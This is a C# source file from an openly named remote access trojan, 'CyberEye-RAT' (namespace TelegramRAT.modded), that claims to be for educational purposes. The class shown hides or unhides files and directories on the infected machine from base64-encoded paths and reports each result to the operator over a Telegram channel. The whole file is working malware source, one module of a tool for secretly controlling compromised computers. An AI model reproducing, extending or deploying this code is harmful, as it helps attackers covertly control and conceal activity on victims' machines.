/*
       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/

using System;
using System.IO;

namespace TelegramRAT.modded
{
    internal sealed class HideOrUnhideDir
    {
        public static void HideFileOrDirectory(string path)
        {
            path = utils.Base64Decode(path);
            try
            {
                if (File.Exists(path))
                {
                    File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
                    telegram.sendText("✅ File hidden successfully.");
                }
                else if (Directory.Exists(path))
                {
                    DirectoryInfo directoryInfo = new DirectoryInfo(path);
                    directoryInfo.Attributes |= FileAttributes.Hidden;
                    telegram.sendText("✅ Directory hidden successfully.");
                }
                else
                {
                    telegram.sendText("❌ File or directory does not exist.");
                }
            }
            catch (Exception ex)
            {
                telegram.sendText("❌ Error hiding file or directory: " + ex.Message);
            }
        }

        public static void UnhideFileOrDirectory(string path)
        {
            path = utils.Base64Decode(path);
            try
            {
                if (File.Exists(path))
                {
                    File.SetAttributes(path, File.GetAttributes(path) & ~FileAttributes.Hidden);
                    telegram.sendText("✅ File unhidden successfully.");
                }
                else if (Directory.Exists(path))
                {
                    DirectoryInfo directoryInfo = new DirectoryInfo(path);
                    directoryInfo.Attributes &= ~FileAttributes.Hidden;
                    telegram.sendText("✅ Directory unhidden successfully.");
                }
                else
                {
                    telegram.sendText("❌ File or directory does not exist.");
                }
            }
            catch (Exception ex)
            {
                telegram.sendText("❌ Error unhiding file or directory: " + ex.Message);
            }
        }
    }
}
